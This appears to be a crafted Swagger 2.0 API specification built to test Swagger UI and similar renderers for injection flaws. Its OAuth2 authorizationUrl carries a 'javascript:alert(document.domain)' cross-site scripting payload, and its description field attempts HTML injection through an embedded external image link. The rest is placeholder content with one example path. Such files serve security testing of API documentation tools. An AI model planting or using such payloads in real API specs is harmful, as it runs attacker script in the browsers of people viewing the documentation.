swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "0.0.1"
  title: Example Title
  description: html inject <https://geekflare.com/wp-content/uploads/2020/02/Code-injection-e1580817731194.jpg>
paths:
  /:
    get:
      responses:
        200:
          description: Successful respons